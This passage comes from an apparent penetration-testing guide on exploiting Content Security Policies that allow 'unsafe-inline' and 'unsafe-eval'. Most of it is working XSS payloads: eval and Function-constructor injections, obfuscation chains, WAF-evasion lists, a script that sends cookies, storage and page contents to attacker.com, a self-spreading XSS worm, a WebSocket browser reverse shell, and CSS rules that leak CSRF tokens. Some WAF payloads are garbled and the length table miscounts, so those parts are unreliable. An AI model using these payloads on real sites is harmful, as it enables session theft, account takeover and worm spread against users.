grep -rn "JSON\.parse.*function" ./js_files/

# Search for dynamic property access patterns
grep -rn "\[.*\]\s*(" ./js_files/ | head -20

# Using semgrep for taint analysis
semgrep --config "p/javascript" --config "r/javascript.lang.security.audit.eval-injection" ./js_files/

# Using CodeQL (if available)
codeql database analyze ./codeql-db javascript/ql/src/Security/CWE-094 --format=sarif-latest
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser DevTools"}

```javascript [DevTools Sink Detection]
// Override eval to detect calls
const originalEval = eval;
window.eval = function(code) {
  console.trace('[EVAL DETECTED]', code);
  return originalEval(code);
};

// Override Function constructor
const originalFunction = Function;
window.Function = function() {
  console.trace('[FUNCTION CONSTRUCTOR]', arguments);
  return originalFunction.apply(this, arguments);
};

// Monitor setTimeout/setInterval with string args
const origSetTimeout = setTimeout;
window.setTimeout = function(fn, delay) {
  if (typeof fn === 'string') {
    console.trace('[setTimeout STRING]', fn);
  }
  return origSetTimeout.apply(this, arguments);
};

const origSetInterval = setInterval;
window.setInterval = function(fn, delay) {
  if (typeof fn === 'string') {
    console.trace('[setInterval STRING]', fn);
  }
  return origSetInterval.apply(this, arguments);
};

// Monitor innerHTML assignments
const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(value) {
    console.trace('[innerHTML SET]', value.substring(0, 200));
    return origInnerHTML.set.call(this, value);
  },
  get: function() {
    return origInnerHTML.get.call(this);
  }
});
```

:::

:::tabs-item{icon="i-lucide-scan" label="Automated Tools"}

```bash [Automated Sink Discovery]
# DOM Invader (Burp Suite)
# Enable in Burp embedded browser
# Settings > DOM Invader > Enable > Postmessage, Prototype pollution, DOM clobbering

# retire.js for vulnerable library detection
retire --js --jspath ./js_files/ --outputformat json

# ESLint security rules
npx eslint --rule '{"no-eval": "error", "no-implied-eval": "error", "no-new-func": "error"}' ./js_files/

# JSA (JavaScript Static Analysis)
python3 jsa.py --scan --sinks eval,Function,setTimeout,setInterval --target https://target.com

# Nuclei DOM-based checks
nuclei -u https://target.com -tags dom-xss,javascript

# dalfox DOM sink detection
dalfox url "https://target.com/?q=test" --dom --deep-domxss
```

:::

::

### eval() Exploitation Payloads

::code-group

```javascript [Direct eval Injection]
// If application does: eval(userInput)
alert(1)
alert(document.domain)
alert(document.cookie)
fetch('https://attacker.com/?c='+document.cookie)
new Image().src='https://attacker.com/?c='+document.cookie

// Multi-statement
var x=document.cookie;fetch('https://attacker.com/?c='+encodeURIComponent(x))

// Obfuscated
\x61\x6c\x65\x72\x74(1)
\u0061\u006c\u0065\u0072\u0074(1)
```

```javascript [Function Constructor]
// new Function() acts as eval in global scope
new Function('alert(1)')()
new Function('alert(document.domain)')()
new Function('return alert(1)')()
new Function('','alert(1)')()
Function('alert(1)')()
Function('fetch("https://attacker.com/?c="+document.cookie)')()

// Indirect Function constructor
[].constructor.constructor('alert(1)')()
''.constructor.constructor('alert(1)')()
/x/.constructor.constructor('alert(1)')()
(0).constructor.constructor('alert(1)')()
true.constructor.constructor('alert(1)')()
```

```javascript [setTimeout / setInterval Strings]
// String argument to setTimeout = eval equivalent
setTimeout('alert(1)',0)
setTimeout('alert(document.domain)',0)
setTimeout('fetch("https://attacker.com/?c="+document.cookie)',0)

// setInterval
setInterval('alert(1)',0)
setInterval('fetch("https://attacker.com/?c="+document.cookie)',60000)

// With variable
var payload='alert(1)';setTimeout(payload,0)
```

```javascript [Indirect eval]
// Indirect eval (evaluates in global scope)
(0,eval)('alert(1)')
(1,eval)('alert(1)')
var e=eval;e('alert(1)')
window['eval']('alert(1)')
self['eval']('alert(1)')
globalThis['eval']('alert(1)')
this['eval']('alert(1)')
top['eval']('alert(1)')
frames['eval']('alert(1)')
[eval][0]('alert(1)')
[]['constructor']['constructor']('alert(1)')()
```

::

### DOM-Based eval Exploitation Scenarios

::tabs

:::tabs-item{icon="i-lucide-hash" label="URL Hash Injection"}

```text [Hash-to-eval Flow]
Application Code:
  var config = location.hash.substring(1);
  eval('var settings = ' + config);

Attack URL:
  https://target.com/page#1;alert(document.cookie)//
  https://target.com/page#1);alert(1)//
  https://target.com/page#{};alert(1)//

Encoded:
  https://target.com/page#1%3Balert(document.cookie)%2F%2F
```

```html [Hash Exploitation Payloads]
<!-- If app does: eval(location.hash.slice(1)) -->
https://target.com/#alert(1)
https://target.com/#alert(document.domain)
https://target.com/#fetch('https://attacker.com/?c='+document.cookie)

<!-- If app does: eval('var x = ' + location.hash.slice(1)) -->
https://target.com/#1;alert(1)//
https://target.com/#1;fetch('https://attacker.com/?c='+document.cookie)//
https://target.com/#{};alert(1);//
https://target.com/#'';alert(1);//
```

:::

:::tabs-item{icon="i-lucide-search" label="Query Parameter Injection"}

```text [Query-to-eval Flow]
Application Code:
  var search = new URLSearchParams(location.search).get('q');
  var results = eval('searchDB("' + search + '")');

Attack URL:
  https://target.com/search?q=");alert(1)//
  https://target.com/search?q=");fetch('https://attacker.com/?c='+document.cookie)//
  https://target.com/search?q=test");alert(1);//
```

```html [Query Parameter Payloads]
<!-- Breaking out of string context in eval -->
https://target.com/?q=");alert(1)//
https://target.com/?q=');alert(1)//
https://target.com/?q=`);alert(1)//
https://target.com/?q=\");alert(1)//
https://target.com/?q="+alert(1)+"
https://target.com/?q='+alert(1)+'
https://target.com/?q=\x22);alert(1)//
https://target.com/?q=%22);alert(1)//
```

:::

:::tabs-item{icon="i-lucide-mail" label="postMessage Injection"}

```javascript [postMessage to eval]
// If target has: window.addEventListener('message', function(e) { eval(e.data); });
// Or: window.addEventListener('message', function(e) { new Function(e.data)(); });

// Attacker page:
<script>
var target = window.open('https://target.com/vulnerable-page');
setTimeout(function(){
  target.postMessage('alert(document.cookie)', '*');
}, 2000);
</script>

// Via iframe:
<iframe id="f" src="https://target.com/vulnerable-page"></iframe>
<script>
setTimeout(function(){
  document.getElementById('f').contentWindow.postMessage(
    'fetch("https://attacker.com/?c="+document.cookie)', '*'
  );
}, 2000);
</script>

// JSON.parse in message handler that flows to eval:
<script>
var w = window.open('https://target.com');
setTimeout(function(){
  w.postMessage('{"action":"eval","code":"alert(1)"}', '*');
}, 2000);
</script>
```

:::

:::tabs-item{icon="i-lucide-braces" label="JSON Injection to eval"}

```text [JSON Context Breakout]
Application Code:
  var data = eval('(' + jsonResponse + ')');
  // or
  var config = eval(ajaxResponse);

Attack (if controlling JSON response or part of it):
  {"name":"test","value":"1"}));alert(1)//"}
  {"key":"val");alert(1)//"}
  {"__proto__":{"constructor":{"prototype":{"toString":function(){alert(1)}}}}}

If controlling a JSON key or value that gets eval'd:
  Input: test");alert(1)//
  Becomes: eval('({"key":"test");alert(1)//"})') 
  Executes: alert(1)
```

:::

::

### Advanced eval Chain Techniques

::code-group

```javascript [Obfuscated eval Chains]
// atob (Base64)
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
// decodes to: alert(document.domain)

// String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
// decodes to: alert(1)

// URL decode
eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))

// Reverse string
eval(')(1(trela'.split('').reverse().join(''))

// Array operations
eval(['ale','rt(','1)'].join(''))

// charCodeAt reconstruction
var s='';[97,108,101,114,116,40,49,41].forEach(function(c){s+=String.fromCharCode(c)});eval(s)

// Replace obfuscation
eval('XlXrX(1)'.replace(/X/g,'').replace('l','ale').replace('r','rt'))

// Template literal
eval(`${'ale'}${'rt'}(1)`)

// Object.keys trick
eval(Object.keys({alert:1})[0]+'(1)')
```

```javascript [Prototype Chain eval]
// constructor.constructor
[].constructor.constructor('alert(1)')()
''['constructor']['constructor']('alert(1)')()
/./['constructor']['constructor']('alert(1)')()
0['constructor']['constructor']('alert(1)')()
false['constructor']['constructor']('alert(1)')()
null['constructor']['constructor']  // TypeError — null has no constructor

// Reflect.construct
Reflect.construct(Function, ['alert(1)'])()
Reflect.apply(eval, null, ['alert(1)'])
Reflect.apply(Function, null, ['alert(1)'])()

// Proxy-based
new Proxy({}, {get: function(){ eval('alert(1)') }}).x

// Symbol.toPrimitive abuse
var obj = {[Symbol.toPrimitive]: function(){ eval('alert(1)'); return 1; }};
+obj; // triggers toPrimitive
```

```javascript [Dynamic import]
// import() returns a promise — bypasses some eval restrictions
import('data:text/javascript,alert(1)')
import('https://attacker.com/evil.mjs')

// Blob URL
var blob = new Blob(['alert(1)'], {type: 'text/javascript'});
var url = URL.createObjectURL(blob);
import(url);

// Worker-based eval
var w = new Worker(URL.createObjectURL(new Blob(['postMessage(eval("1+1"))'])));
w.onmessage = function(e){ console.log(e.data); };
```

::

---

## Phase 4 — Both Directives Present

### Full Exploitation When Both unsafe-inline AND unsafe-eval Are Present

::caution
When CSP contains both `'unsafe-inline'` and `'unsafe-eval'`, the policy provides absolutely zero protection against XSS. Every standard XSS payload works without modification.
::

```text [Both Directives — Complete Bypass Map]
┌────────────────────────────────────────────────────────┐
│  script-src 'self' 'unsafe-inline' 'unsafe-eval'      │
│                                                        │
│  ✅ <script>alert(1)</script>                          │
│  ✅ <img src=x onerror="alert(1)">                    │
│  ✅ <svg onload="alert(1)">                           │
│  ✅ <a href="javascript:alert(1)">                    │
│  ✅ eval("alert(1)")                                  │
│  ✅ new Function("alert(1)")()                        │
│  ✅ setTimeout("alert(1)", 0)                         │
│  ✅ import('https://attacker.com/evil.js')            │
│  ✅ document.write('<script>alert(1)<\/script>')      │
│  ✅ element.innerHTML = '<img onerror=alert(1) src>'  │
│  ✅ EVERY STANDARD XSS PAYLOAD                        │
│                                                        │
│  CSP = USELESS FOR XSS PROTECTION                     │
└────────────────────────────────────────────────────────┘
```

::tabs

:::tabs-item{icon="i-lucide-swords" label="Complete Attack Suite"}

```html [Full Attack Payloads — Both Directives]
<!-- Inline script + eval chain -->
<script>
eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWUp'));
</script>

<!-- Event handler + Function constructor -->
<img src=x onerror="new Function('fetch(`https://attacker.com/?c=${document.cookie}`)')()">

<!-- javascript: URI + eval -->
<a href="javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">click</a>

<!-- SVG + setTimeout string -->
<svg onload="setTimeout('fetch(`https://attacker.com/?c=`+document.cookie)',0)">

<!-- Full reconnaissance payload -->
<script>
(async function(){
  var data = {
    cookies: document.cookie,
    url: location.href,
    referrer: document.referrer,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    title: document.title,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenRes: screen.width+'x'+screen.height,
    plugins: Array.from(navigator.plugins).map(p=>p.name),
    dom: document.documentElement.outerHTML.substring(0, 50000)
  };

  // Try to get internal network info
  try {
    var rtc = new RTCPeerConnection({iceServers:[]});
    rtc.createDataChannel('');
    var offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);
    rtc.onicecandidate = function(e){
      if(e.candidate){
        data.internalIP = e.candidate.candidate;
        sendData();
      }
    };
  } catch(e) {}

  function sendData(){
    fetch('https://attacker.com/full-exfil', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
  
  setTimeout(sendData, 3000);
})();
</script>
```

:::

:::tabs-item{icon="i-lucide-worm" label="XSS Worm"}

```html [Self-Propagating XSS Worm]
<script>
// Self-propagating XSS worm for testing
(function worm(){
  var payload = '<script>(' + worm.toString() + ')()<\/script>';
  
  // Spread via comments/posts
  fetch('/api/posts', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: 'Check this out! ' + payload
    })
  });
  
  // Spread via profile
  fetch('/api/profile', {
    method: 'PUT',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      bio: payload
    })
  });
  
  // Exfiltrate current victim data
  fetch('https://attacker.com/worm-victim', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      user: document.querySelector('.username')?.textContent
    })
  });
})();
</script>
```

:::

:::tabs-item{icon="i-lucide-terminal" label="Reverse Shell (via XSS)"}

```html [Browser-Based Reverse Shell]
<script>
// WebSocket-based browser reverse shell
(function(){
  var ws = new WebSocket('wss://attacker.com/shell');
  ws.onmessage = function(e){
    try {
      var result = eval(e.data);
      ws.send(JSON.stringify({output: String(result)}));
    } catch(err) {
      ws.send(JSON.stringify({error: err.message}));
    }
  };
  ws.onclose = function(){
    setTimeout(arguments.callee, 5000);
  };
  ws.onopen = function(){
    ws.send(JSON.stringify({
      status: 'connected',
      url: location.href,
      cookies: document.cookie,
      userAgent: navigator.userAgent
    }));
  };
})();
</script>
```

:::

::

---

## Phase 5 — Nonce and Hash Bypass with unsafe-inline

### Understanding Nonce + unsafe-inline Interaction

::note
When CSP includes both a `nonce` and `'unsafe-inline'`, modern browsers (CSP Level 2+) **ignore** `'unsafe-inline'` in favor of the nonce. However, older browsers that only support CSP Level 1 will fall back to `'unsafe-inline'`. This creates bypass opportunities.
::

```text [Nonce vs unsafe-inline Priority]
CSP: script-src 'nonce-abc123' 'unsafe-inline'

Modern Browser (CSP Level 2+):
  ├── 'unsafe-inline' is IGNORED
  ├── Only scripts with nonce-abc123 execute
  └── Inline scripts without nonce are BLOCKED ✅

Legacy Browser (CSP Level 1 only):
  ├── Nonce is NOT UNDERSTOOD (ignored)
  ├── 'unsafe-inline' is APPLIED
  └── ALL inline scripts execute ⚠️

Attack Strategy:
  ├── Target users on legacy browsers
  ├── Find nonce leakage/prediction
  ├── Find injection before nonce'd script
  └── Use strict-dynamic escalation
```

### Nonce Bypass Techniques

::tabs

:::tabs-item{icon="i-lucide-key" label="Nonce Leakage"}

```bash [Nonce Discovery]
# Check if nonce changes per request
for i in $(seq 1 5); do
  curl -sI https://target.com | grep -oP "nonce-[a-zA-Z0-9+/=]+" | head -1
done
# If nonce is static = VULNERABLE

# Check if nonce is in page source (for extraction)
curl -s https://target.com | grep -oP "nonce=['\"][a-zA-Z0-9+/=]+['\"]" | head -5

# Check for nonce in cached responses
curl -sI https://target.com | grep -i "cache-control"
# If public caching is enabled, nonce may be cached = VULNERABLE

# Check CDN caching
curl -sI https://target.com | grep -iE "x-cache|cf-cache|age:|x-served-by|x-varnish"
```

```javascript [Browser Nonce Extraction]
// Extract nonce from existing script tags
document.querySelector('script[nonce]')?.nonce
document.querySelector('script[nonce]')?.getAttribute('nonce')

// All nonces on page
Array.from(document.querySelectorAll('[nonce]')).map(e => ({
  tag: e.tagName,
  nonce: e.nonce || e.getAttribute('nonce')
}))

// If XSS exists and nonce is extractable:
var nonce = document.querySelector('script[nonce]').nonce;
var s = document.createElement('script');
s.nonce = nonce;
s.textContent = 'alert(document.domain)';
document.body.appendChild(s);
```

:::

:::tabs-item{icon="i-lucide-repeat" label="Nonce Reuse / Prediction"}

```bash [Nonce Analysis]
# Collect nonces for pattern analysis
for i in $(seq 1 100); do
  NONCE=$(curl -s https://target.com | grep -oP "nonce=['\"]([a-zA-Z0-9+/=]+)['\"]" | head -1 | cut -d'"' -f2)
  echo "$NONCE"
done | tee nonces.txt

# Check entropy
sort nonces.txt | uniq -c | sort -rn | head
# Duplicates = weak nonce generation

# Check length
awk '{ print length }' nonces.txt | sort -u
# Short nonces = brute-forceable

# Check for timestamp-based nonces
python3 -c "
import base64, sys
for line in open('nonces.txt'):
    n = line.strip()
    try:
        decoded = base64.b64decode(n)
        print(f'{n} -> {decoded.hex()} -> possible timestamp: {int.from_bytes(decoded[:4], \"big\")}')
    except: pass
"

# Check if nonce is derived from session/predictable values
# Compare nonce across different sessions, IPs, user-agents
```

:::

:::tabs-item{icon="i-lucide-injection" label="Injection Before Nonce"}

```html [Script Gadget Injection]
<!-- If injection point is before a nonce'd script tag -->
<!-- Original page: -->
<div>USER_INPUT_HERE</div>
<script nonce="abc123">
  // Application code
</script>

<!-- Attack: close the div, inject content that the nonce'd script will process -->
</div><script nonce="abc123">alert(1)</script><div>

<!-- If injection is within a nonce'd script's string: -->
<script nonce="abc123">
  var name = "USER_INPUT";
  // Becomes:
  var name = ""; alert(1); //";
</script>

<!-- Script gadget: if nonce'd script reads from DOM -->
<script nonce="abc123">
  var config = document.getElementById('config').textContent;
  eval(config); // unsafe-eval allows this
</script>
<!-- Inject: -->
<div id="config">alert(document.cookie)</div>
```

:::

::

### Hash Bypass Techniques

```text [Hash Bypass Scenarios]
CSP: script-src 'sha256-xxxxx' 'unsafe-inline'

Hash Bypass Conditions:
1. If the hash matches a benign script that can be abused
   - Script reads from attacker-controlled DOM
   - Script processes URL parameters
   - Script evaluates user data

2. If unsafe-inline is also present and browser is CSP Level 1:
   - Hash is ignored, unsafe-inline applies
   - All inline scripts execute

3. Hash collision (theoretical, computationally infeasible for SHA-256):
   - Not practical for real attacks
```

---

## Phase 6 — strict-dynamic Interaction

### strict-dynamic + unsafe-inline / unsafe-eval

::warning
`'strict-dynamic'` in `script-src` causes browsers to ignore `'unsafe-inline'` and any domain whitelists, but **does NOT** ignore `'unsafe-eval'`. If both `'strict-dynamic'` and `'unsafe-eval'` are present, `eval()` and `Function()` remain fully functional.
::

```text [strict-dynamic Interaction Matrix]
┌──────────────────────────────────────────────────────────────────┐
│  Directive Combination             │ Inline │ eval │ Whitelist  │
│────────────────────────────────────│────────│──────│────────────│
│  script-src 'strict-dynamic'       │ ❌     │ ❌   │ IGNORED    │
│  + 'unsafe-inline'                 │ ❌     │ ❌   │ IGNORED    │
│  + 'unsafe-eval'                   │ ❌     │ ✅   │ IGNORED    │
│  + 'unsafe-inline' + 'unsafe-eval' │ ❌     │ ✅   │ IGNORED    │
│  + nonce + 'unsafe-eval'           │ nonce  │ ✅   │ IGNORED    │
│                                    │ only   │      │            │
└──────────────────────────────────────────────────────────────────┘

Key: strict-dynamic ALWAYS overrides unsafe-inline
     strict-dynamic NEVER overrides unsafe-eval
```

::code-group

```html [strict-dynamic + unsafe-eval Attack]
<!-- CSP: script-src 'strict-dynamic' 'nonce-xxx' 'unsafe-eval' -->
<!-- unsafe-eval is still active! -->

<!-- If injection into a nonce'd script context: -->
<script nonce="xxx">
  var userInput = "USER_CONTROLLED";
  // Attacker injects: "; eval('alert(1)'); //
  var userInput = ""; eval('alert(1)'); //"
</script>

<!-- If application uses eval with user data anywhere: -->
<script nonce="xxx">
  // If this script does: eval(someUserData)
  // eval() is allowed by unsafe-eval
</script>

<!-- DOM-based: if nonce'd script reads hash/params -->
<script nonce="xxx">
  var q = new URLSearchParams(location.search).get('q');
  eval('search("' + q + '")'); // unsafe-eval allows this
</script>
<!-- Attack: ?q=");alert(1)// -->
```

```html [Trust Propagation Attack]
<!-- strict-dynamic: scripts loaded by trusted scripts inherit trust -->
<!-- If a trusted script dynamically creates scripts: -->
<script nonce="xxx">
  var s = document.createElement('script');
  s.src = userControlledURL; // attacker controls this
  document.body.appendChild(s);
  // The new script is trusted because parent had nonce
</script>
```

::

---

## Phase 7 — WAF and Filter Evasion

### Inline Script Filter Bypasses

::tabs

:::tabs-item{icon="i-lucide-shield" label="Tag Obfuscation"}

```html [Script Tag Evasion]
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Null bytes (legacy) -->
<scr\x00ipt>alert(1)</script>

<!-- Tab/newline/CR in tag name -->
<script	>alert(1)</script>
<script
>alert(1)</script>
<script >alert(1)</script>

<!-- Forward slash instead of space -->
<script/x>alert(1)</script>
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Backtick instead of quotes -->
<img src=x onerror=`alert(1)`>

<!-- No quotes needed -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- HTML comments -->
<!--><script>alert(1)</script>-->
<comment><script>alert(1)</script></comment>

<!-- CDATA in SVG/XML context -->
<svg><![CDATA[><script>alert(1)</script>]]></svg>

<!-- Entity encoding in event handlers -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

<!-- Double encoding -->
<img src=x onerror="al%65rt(1)">

<!-- Unicode normalization -->
<img src=x onerror="al\u0065rt(1)">
```

:::

:::tabs-item{icon="i-lucide-shield" label="Function Name Evasion"}

```html [Blocked Function Alternatives]
<!-- If 'alert' is blocked -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
<script>window['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>frames['al'+'ert'](1)</script>
<script>globalThis['al'+'ert'](1)</script>
<script>Reflect.apply(alert,window,[1])</script>
<script>setTimeout(alert,0,1)</script>
<script>setInterval(alert,0,1)</script>
<script>queueMicrotask(()=>alert(1))</script>
<script>requestAnimationFrame(()=>alert(1))</script>
<script>[1].find(alert)</script>
<script>[1].map(alert)</script>
<script>[1].filter(alert)</script>
<script>[1].forEach(alert)</script>
<script>[1].reduce(alert,1)</script>
<script>[1].every(alert)</script>
<script>[1].some(alert)</script>
<script>Array.from([1],alert)</script>
<script>Promise.resolve(1).then(alert)</script>

<!-- If 'document' is blocked -->
<script>window['doc'+'ument'].cookie</script>
<script>self['doc'+'ument'].cookie</script>

<!-- If 'cookie' is blocked -->
<script>document['coo'+'kie']</script>

<!-- If 'fetch' is blocked -->
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
<script>navigator.sendBeacon('https://attacker.com/s',document.cookie)</script>
<script>var x=new XMLHttpRequest();x.open('GET','https://attacker.com/?c='+document.cookie);x.send()</script>

<!-- If parentheses () are blocked -->
<script>alert`1`</script>
<script>setTimeout`alert\x28document.domain\x29`</script>
<script>onerror=alert;throw 1</script>
<script>onerror=alert;throw document.domain</script>
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<img src=x onerror=alert`1`>

<!-- If quotes are blocked -->
<script>alert(1)</script>
<script>alert(/xss/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(atob(/eHNz/.source))</script>
<script>alert(document.domain)</script>
```

:::

:::tabs-item{icon="i-lucide-shield" label="WAF-Specific"}

::code-collapse

```html [WAF Bypass Payloads]
<!-- Cloudflare WAF -->
<svg onload=alert(1)>
<svg onload=alert`1`>
<svg/onload=self[`al`+`ert`](1)>
<img src=x onerror=self[`\x61\x6c\x65\x72\x74`](1)>
<details/open/ontoggle=confirm(1)>
<math><mi//telefondata="1telefonx]telefononfocus=alert(1)//telefonautofocus>

<!-- Akamai Kona WAF -->
<img src=x onerror="window['al\x65rt'](1)">
<svg/onload=top[/al/.source+/ert/.source](1)>
<img src=x onerror=window[atob('YWxlcnQ=')](1)>

<!-- AWS WAF -->
<img src=x onerror="globalThis[`al`+`ert`](1)">
<svg onload="top[`al`+`ert`](1)">
<img src onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- ModSecurity CRS -->
<img src=x onerror="window['a]l'+'e]r'+'t'](1)">
<svg/onload="top['ale'+'rt'](1)">
<!-- PL1 bypass -->
<details open ontoggle=alert(1)>
<!-- PL2 bypass -->
<img src=x onerror=this['ale'+'rt'](1)>

<!-- Imperva / Incapsula -->
<img src=x onerror=alert(1)//
<svg onload=alert`1`>
<svg/onload=confirm(1)>

<!-- F5 BIG-IP ASM -->
<img src=x onerror=top[/al/.source+/ert/.source](1)>
<img src=x onerror=self['a]ler'+'t'](1)>

<!-- Barracuda WAF -->
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src onerror=alert(1)>

<!-- Sucuri WAF -->
<svg onload=confirm(1)>
<img src=x onerror=prompt(1)>
<details/open/ontoggle=self['a]l'+'e]r'+'t'](1)>

<!-- Generic multi-WAF bypass attempts -->
<img src=x onerror="(()=>{this['ale'+'rt'](1)})()">
<svg/onload="try{ale]rt(1)}catch(e){}">
<img src=x onerror="Function('ale'+'rt(1)')()">
<img src=x onerror="[]['constructor']['constructor']('alert(1)')()">
<img src=x onerror="Reflect.apply(alert,null,[1])">
```

::

:::

::

### eval Filter Bypasses

::code-group

```javascript [eval Obfuscation]
// If 'eval' string is blocked
window['ev'+'al']('alert(1)')
self['ev'+'al']('alert(1)')
globalThis['ev'+'al']('alert(1)')
this['ev'+'al']('alert(1)')
(0,eval)('alert(1)')
[eval][0]('alert(1)')
var e=eval;e('alert(1)')

// Bracket notation
window['eval']('alert(1)')
self['\x65\x76\x61\x6c']('alert(1)')
window[atob('ZXZhbA==')]('alert(1)')
window['\u0065\u0076\u0061\u006c']('alert(1)')

// Via Function name
eval.call(null,'alert(1)')
eval.apply(null,['alert(1)'])
eval.bind(null,'alert(1)')()
Reflect.apply(eval,null,['alert(1)'])

// If Function is blocked
[]['constructor']['constructor']('alert(1)')()
''['constructor']['constructor']('alert(1)')()
/x/['constructor']['constructor']('alert(1)')()
(0)['constructor']['constructor']('alert(1)')()

// Alternate timer sinks
setTimeout['call'](null,'alert(1)',0)
setInterval['call'](null,'alert(1)',0)
setTimeout.call(null,'alert(1)',0)
```

```javascript [Payload Encoding for eval]
// Base64
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))

// Hex escape
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')

// Unicode escape
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')

// URL encoding in eval context
eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))

// String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))

// Octal (in some contexts)
eval('\141\154\145\162\164\050\061\051')

// Mixed encoding
eval('\x61l\u0065rt(1)')

// Template literal
eval(`${'al'}${'ert'}(1)`)

// Concat from array
eval(['al','ert','(1)'].join(''))

// Split and reverse
eval(')1(trela'.split('').reverse().join(''))

// ROT13 decode + eval
function rot13(s){return s.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26)})}
eval(rot13('nyreg(1)'))
```

::

### Length-Restricted Payloads

::collapsible

| Length | Payload | Notes |
| --- | --- | --- |
| 10 | `alert()` | Minimal alert (inside event handler/eval) |
| 13 | `alert(1)` | Basic PoC |
| 16 | `confirm(1)` | Alternative to alert |
| 17 | `prompt(1)` | Alternative to alert |
| 20 | `alert(document.domain)` | — |
| 20 | `<svg onload=alert(1)>` | Full HTML payload |
| 22 | `<img src=x onerror=alert(1)>` | — |
| 25 | `onerror=alert;throw 1` | No parentheses needed |
| 29 | `eval(atob('YWxlcnQoMSk='))` | Base64 decode + eval |
| 31 | `<script>alert(1)</script>` | Full script tag |
| 39 | `<input autofocus onfocus=alert(1)>` | Auto-firing event |
| 33 | `<details open ontoggle=alert(1)>` | Auto-fires on some browsers |
| 18 | `throw onerror=alert,1` | Ultra-short, no parens |
| 21 | `{onerror=alert}throw 1` | Block statement variant |
| 19 | `[1].map(alert)` | Array method |
| 23 | `[1].find(alert)` | Array method |
| 27 | `Array.from([1],alert)` | Array.from |
| 33 | `Promise.resolve(1).then(alert)` | Promise-based |
| 20 | `location='javascript:alert(1)'` | javascript: URI (inside eval/inline script) |
| 25 | `import('//evil.com/x.js')` | Dynamic import |
| 19 | `navigator.sendBeacon` | For exfil (needs args) |

::

---

## Phase 8 — Advanced Exploitation Techniques

### DOM Clobbering + unsafe-eval

```html [DOM Clobbering to eval]
<!-- If application does: if(config) eval(config.code) -->
<!-- And CSP has unsafe-eval -->

<!-- Clobber the 'config' variable via DOM -->
<a id="config"></a>
<a id="config" name="code" href="alert(1)"></a>

<!-- Now: window.config exists, config.code = "alert(1)" -->
<!-- Application's eval(config.code) executes alert(1) -->

<!-- More complex clobbering -->
<form id="config"><input name="code" value="alert(document.cookie)"></form>
<!-- config.code.value = "alert(document.cookie)" -->

<!-- HTMLCollection clobbering -->
<a id="x"></a><a id="x" name="y" href="javascript:alert(1)"></a>
<!-- x[1].y = "javascript:alert(1)" -->
```

### Prototype Pollution + unsafe-eval

```html [Prototype Pollution to eval]
<!-- If prototype pollution exists and unsafe-eval is enabled -->
<script>
// Prototype pollution gadget
Object.prototype.source = 'alert(1)';
// If application does: eval(config.source || 'default')
// Polluted prototype provides 'source' property
</script>

<!-- via query parameter pollution -->
<!-- ?__proto__[source]=alert(1) -->
<!-- If app parses query into object and later eval's a property -->

<!-- Prototype pollution via JSON.parse -->
<script>
var parsed = JSON.parse('{"__proto__":{"polluted":"alert(1)"}}');
// Object.prototype.polluted = 'alert(1)'
// If any eval(obj.polluted) occurs later...
</script>
```

### CSS Injection with unsafe-inline style-src

::note
If `style-src 'unsafe-inline'` is present (or style-src is not set and falls back to default-src with unsafe-inline), CSS injection enables data exfiltration without JavaScript.
::

```html [CSS-Based Data Exfiltration]
<!-- Extract CSRF token character-by-character -->
<style>
input[name="csrf_token"][value^="a"] { background: url('https://attacker.com/css?c=a'); }
input[name="csrf_token"][value^="b"] { background: url('https://attacker.com/css?c=b'); }
input[name="csrf_token"][value^="c"] { background: url('https://attacker.com/css?c=c'); }
/* ... continue for all characters ... */
</style>

<!-- Extract attribute values via CSS selectors -->
<style>
input[type="hidden"][value^="token_a"] { background: url('https://attacker.com/?v=token_a'); }
input[type="hidden"][value^="token_b"] { background: url('https://attacker.com/?v=token_b'); }
</style>

<!-- @import for multi-stage extraction -->
<style>@import url('https://attacker.com/stage1.css');</style>
<!-- attacker.com/stage1.css returns next set of CSS selectors based on previous extraction -->

<!-- @font-face unicode-range for text extraction -->
<style>
@font-face { font-family: 'leak'; src: url('https://attacker.com/?c=A'); unicode-range: U+0041; }
@font-face { font-family: 'leak'; src: url('https://attacker.com/?c=B'); unicode-range: U+0042; }
